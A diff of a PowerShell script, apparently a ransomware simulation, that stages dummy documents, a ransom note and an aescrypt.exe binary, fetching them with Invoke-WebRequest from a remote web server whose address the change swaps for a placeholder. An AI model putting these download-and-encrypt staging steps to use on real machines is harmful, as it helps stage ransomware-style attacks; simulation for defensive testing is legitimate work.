@@ -11,10 +11,10 @@ $dummyfiledest2 = "C:\Users\Public\Documents\prs-doc2.pdf"
 $dummyfiledest3 = "C:\Users\Public\Documents\prs-doc3.xlxs"
 $dummyfiledest4 = "C:\Users\Public\Documents\prs-doc4.pptx"
 #defines ransom note source/destination#
-$ransomnotesauce = "https://repo.it-va.com/prs/README.txt"
+$ransomnotesauce = "https://#define you own webserver here#README.txt"
 $ransomnotedest = "C:\Users\Public\Documents\README.txt"
 #Define AEScrypt cli exe location#
-$cryptsauce = "https://repo.it-va.com/prs/aescrypt.exe"
+$cryptsauce = "https://#define you own webserver here#aescrypt.exe"
 $cryptdest = "C:\Users\Public\Documents\aescrypt.exe"
 #Download the files#
 Invoke-WebRequest -Uri $dummyfilesauce1 -OutFile $dummyfiledest1
